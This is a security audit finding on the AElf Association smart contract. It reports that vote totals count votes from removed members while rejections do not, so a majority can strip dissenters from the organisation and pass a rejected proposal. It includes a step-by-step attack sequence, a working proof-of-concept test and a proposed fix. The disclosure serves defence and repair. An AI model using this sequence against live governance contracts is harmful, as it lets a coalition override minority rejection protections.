# Audit Report

## Title
Inconsistent Vote Accounting After Member Removal Allows Governance Manipulation

## Summary
The Association contract's vote counting logic contains a critical inconsistency that allows governance manipulation. When members are removed from an organization after voting on active proposals, their votes are counted inconsistently: individual vote type counts (approvals, rejections, abstentions) filter by current membership, but the total vote threshold count includes all historical votes from removed members. This enables a majority coalition to bypass rejection thresholds by removing dissenting members after they vote.

## Finding Description

The vulnerability stems from three interconnected flaws in the Association contract:

**1. Member Removal Without Vote Cleanup**

The `RemoveMember` function removes an address from the organization's member list but does not invalidate that member's existing votes on active proposals. [1](#0-0) 

**2. Inconsistent Vote Counting Logic**

The threshold validation logic applies different filtering rules to different vote counts:

- **Rejection count** filters by current membership using `.Count(organization.OrganizationMemberList.Contains)` [2](#0-1) 

- **Abstention count** filters by current membership [3](#0-2) 

- **Approval count** filters by current membership [4](#0-3) 

- **Total vote count** does NOT filter - it concatenates all lists and counts ALL historical votes regardless of current membership status [5](#0-4) 

**3. Release Validation Uses Current Organization State**

When releasing a proposal, the validation retrieves the current organization state and applies the inconsistent counting logic, meaning members removed between voting and release have their votes handled incorrectly. [6](#0-5) 

**Attack Sequence:**
1. Proposal A is created (contentious action)
2. Members vote: 4 approve, 3 reject (7 total)
3. Proposal B is created to remove the 3 rejecting members
4. Majority coalition approves Proposal B
5. Proposal B is released (members removed)
6. Proposal A is now released successfully despite having been rejected

**Root Cause:** The filtering predicate `organization.OrganizationMemberList.Contains` is correctly applied to individual vote type counts but incorrectly omitted from the total vote count aggregation.

## Impact Explanation

**HIGH Severity** - This vulnerability fundamentally undermines governance integrity:

1. **Threshold Bypass**: Removed members' rejections no longer count toward `MaximalRejectionThreshold` and abstentions no longer count toward `MaximalAbstentionThreshold`, while their votes still count toward `MinimalVoteThreshold`.

2. **Governance Manipulation**: Proposals that should be rejected can be artificially approved by strategically removing dissenting members after they vote.

3. **Minority Silencing**: A majority coalition can retroactively nullify minority opposition through member removal, defeating the purpose of rejection and abstention thresholds.

4. **Quorum Gaming**: The `MinimalVoteThreshold` can be satisfied with votes from removed members while actual current member participation is lower than intended.

**Concrete Example:**
- Organization: 10 members  
- Thresholds: MinimalVoteThreshold=7, MinimalApprovalThreshold=4, MaximalRejectionThreshold=2
- Initial votes: 4 approve, 3 reject (7 total)
- Expected: 3 rejections > MaximalRejectionThreshold(2) → **REJECTED**
- After removing 3 dissenters: 4 approvals (meets min), 0 rejections (under max), 7 total votes (meets quorum) → **APPROVED**

## Likelihood Explanation

**HIGH Likelihood** - This attack is highly feasible:

**Attacker Capabilities**: Only requires control of an organizational majority to pass a member removal proposal - realistic for any multi-party governance organization where coalitions form.

**Attack Complexity**: LOW - Six simple steps using only public contract methods:
1. Create contentious proposal
2. Wait for votes
3. Create member removal proposal targeting dissenters
4. Obtain majority approval for removal
5. Release removal proposal
6. Release original proposal (now passes)

**Feasibility Factors**:
- All steps use standard public methods available to any organization member
- No special permissions required beyond organizational majority (which is obtainable)
- Attack is indistinguishable from legitimate governance operations
- Economically rational for high-value proposals
- No technical barriers to execution

## Recommendation

**Fix the inconsistent vote counting logic by applying membership filtering to the total vote count:**

In `Association_Helper.cs`, modify the `CheckEnoughVoteAndApprovals` method to filter the total vote count by current membership:

```csharp
private bool CheckEnoughVoteAndApprovals(ProposalInfo proposal, Organization organization)
{
    var approvedMemberCount = proposal.Approvals.Count(organization.OrganizationMemberList.Contains);
    var isApprovalEnough =
        approvedMemberCount >= organization.ProposalReleaseThreshold.MinimalApprovalThreshold;
    if (!isApprovalEnough)
        return false;

    // FIX: Filter total vote count by current membership
    var currentMemberVotes = proposal.Abstentions
        .Concat(proposal.Approvals)
        .Concat(proposal.Rejections)
        .Where(organization.OrganizationMemberList.Contains); // Add membership filter
    
    var isVoteThresholdReached =
        currentMemberVotes.Count() >= organization.ProposalReleaseThreshold.MinimalVoteThreshold;
    return isVoteThresholdReached;
}
```

**Alternative approaches:**
1. Invalidate all votes from a member when they are removed from the organization
2. Prevent member removal while they have votes on active proposals
3. Block proposal release if any voters are no longer current members

The recommended fix maintains consistency by ensuring all vote counts use the same membership filtering logic.

## Proof of Concept

```csharp
[Fact]
public async Task MemberRemovalAllowsGovernanceManipulation_Test()
{
    // Setup: Organization with 10 members (using Reviewer1, Reviewer2, Reviewer3 as subset)
    // Thresholds designed to require broad consensus
    var minimalApprovalThreshold = 4;   // Need 4 approvals
    var minimalVoteThreshold = 7;        // Need 7 total votes
    var maximalRejectionThreshold = 2;   // Max 2 rejections allowed
    var maximalAbstentionThreshold = 1;  // Max 1 abstention allowed
    
    var organizationAddress = await CreateOrganizationAsync(
        minimalApprovalThreshold, 
        minimalVoteThreshold,
        maximalAbstentionThreshold, 
        maximalRejectionThreshold, 
        Reviewer1);

    // Create contentious proposal A
    var proposalA = await CreateProposalAsync(Reviewer1KeyPair, organizationAddress);
    
    // Vote on proposal A: 4 approvals, 3 rejections (7 total votes)
    // Using available test accounts as proxies for the 7 voters
    await ApproveAsync(Accounts[1].KeyPair, proposalA); // Approval 1
    await ApproveAsync(Accounts[4].KeyPair, proposalA); // Approval 2  
    await ApproveAsync(Accounts[5].KeyPair, proposalA); // Approval 3
    await ApproveAsync(Accounts[6].KeyPair, proposalA); // Approval 4
    
    await RejectAsync(Reviewer2KeyPair, proposalA);     // Rejection 1
    await RejectAsync(Reviewer3KeyPair, proposalA);     // Rejection 2
    await RejectAsync(Accounts[7].KeyPair, proposalA);  // Rejection 3
    
    // Verify proposal A should be REJECTED (3 rejections > maximalRejectionThreshold of 2)
    var proposalStatusBefore = await AssociationContractStub.GetProposal.CallAsync(proposalA);
    proposalStatusBefore.ToBeReleased.ShouldBeFalse(); // Should NOT be releasable
    
    // Attack: Create proposal B to remove the 3 dissenting members
    var removeMember2Proposal = await CreateAssociationProposalAsync(
        Reviewer1KeyPair,
        Reviewer2,  // Remove Reviewer2 who rejected
        nameof(AssociationContractStub.RemoveMember),
        organizationAddress);
    
    // Get majority approval for member removal
    await ApproveAsync(Reviewer1KeyPair, removeMember2Proposal);
    await ApproveAsync(Accounts[4].KeyPair, removeMember2Proposal);
    await ApproveAsync(Accounts[5].KeyPair, removeMember2Proposal);
    await ApproveAsync(Accounts[6].KeyPair, removeMember2Proposal);
    
    // Release proposal B - removes Reviewer2
    await ReleaseAsync(Reviewer1KeyPair, removeMember2Proposal, organizationAddress);
    
    // Repeat for other two dissenters (Reviewer3 and Accounts[7])
    var removeMember3Proposal = await CreateAssociationProposalAsync(
        Reviewer1KeyPair,
        Reviewer3,
        nameof(AssociationContractStub.RemoveMember),
        organizationAddress);
    await ApproveAsync(Reviewer1KeyPair, removeMember3Proposal);
    await ApproveAsync(Accounts[4].KeyPair, removeMember3Proposal);
    await ApproveAsync(Accounts[5].KeyPair, removeMember3Proposal);
    await ApproveAsync(Accounts[6].KeyPair, removeMember3Proposal);
    await ReleaseAsync(Reviewer1KeyPair, removeMember3Proposal, organizationAddress);
    
    var removeMember7Proposal = await CreateAssociationProposalAsync(
        Reviewer1KeyPair,
        Accounts[7].Address,
        nameof(AssociationContractStub.RemoveMember),
        organizationAddress);
    await ApproveAsync(Reviewer1KeyPair, removeMember7Proposal);
    await ApproveAsync(Accounts[4].KeyPair, removeMember7Proposal);
    await ApproveAsync(Accounts[5].KeyPair, removeMember7Proposal);
    await ApproveAsync(Accounts[6].KeyPair, removeMember7Proposal);
    await ReleaseAsync(Reviewer1KeyPair, removeMember7Proposal, organizationAddress);
    
    // Verify members were removed
    var orgAfterRemoval = await AssociationContractStub.GetOrganization.CallAsync(organizationAddress);
    orgAfterRemoval.OrganizationMemberList.OrganizationMembers.Contains(Reviewer2).ShouldBeFalse();
    orgAfterRemoval.OrganizationMemberList.OrganizationMembers.Contains(Reviewer3).ShouldBeFalse();
    orgAfterRemoval.OrganizationMemberList.OrganizationMembers.Contains(Accounts[7].Address).ShouldBeFalse();
    
    // VULNERABILITY: Proposal A is now releasable despite having been rejected
    var proposalStatusAfter = await AssociationContractStub.GetProposal.CallAsync(proposalA);
    proposalStatusAfter.ToBeReleased.ShouldBeTrue(); // EXPLOITED: Now shows as releasable!
    
    // The rejection count is now 0 (filtered by current membership)
    // But total vote count is still 7 (includes removed members' votes)
    // This allows the proposal to pass when it should have been rejected
    
    // Proposal A can now be released successfully
    var releaseResult = await GetAssociationContractTester(Reviewer1KeyPair)
        .Release.SendAsync(proposalA);
    releaseResult.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined);
}
```

## Notes

This vulnerability demonstrates a fundamental flaw in the Association contract's governance model where vote immutability is not properly maintained. The inconsistent application of membership filtering between individual vote type counts and the aggregate total vote count creates an exploitable window for governance manipulation. Organizations using the Association contract for critical decisions should be aware that majority coalitions can retroactively alter proposal outcomes by removing dissenting members, fundamentally undermining the minority protection mechanisms (MaximalRejectionThreshold and MaximalAbstentionThreshold) that the threshold system was designed to provide.

### Citations

**File:** contract/AElf.Contracts.Association/Association.cs (L187-188)
```csharp
        var organization = State.Organizations[proposalInfo.OrganizationAddress];
        Assert(IsReleaseThresholdReached(proposalInfo, organization), "Not approved.");
```

**File:** contract/AElf.Contracts.Association/Association.cs (L266-280)
```csharp
    public override Empty RemoveMember(Address input)
    {
        var organization = State.Organizations[Context.Sender];
        Assert(organization != null, "Organization not found.");
        var removeResult = organization.OrganizationMemberList.OrganizationMembers.Remove(input);
        Assert(removeResult, "Remove member failed.");
        Assert(Validate(organization), "Invalid organization.");
        State.Organizations[Context.Sender] = organization;
        Context.Fire(new MemberRemoved
        {
            OrganizationAddress = Context.Sender,
            Member = input
        });
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.Association/Association_Helper.cs (L36-37)
```csharp
        var rejectionMemberCount =
            proposal.Rejections.Count(organization.OrganizationMemberList.Contains);
```

**File:** contract/AElf.Contracts.Association/Association_Helper.cs (L43-43)
```csharp
        var abstentionMemberCount = proposal.Abstentions.Count(organization.OrganizationMemberList.Contains);
```

**File:** contract/AElf.Contracts.Association/Association_Helper.cs (L49-49)
```csharp
        var approvedMemberCount = proposal.Approvals.Count(organization.OrganizationMemberList.Contains);
```

**File:** contract/AElf.Contracts.Association/Association_Helper.cs (L55-57)
```csharp
        var isVoteThresholdReached =
            proposal.Abstentions.Concat(proposal.Approvals).Concat(proposal.Rejections).Count() >=
            organization.ProposalReleaseThreshold.MinimalVoteThreshold;
```
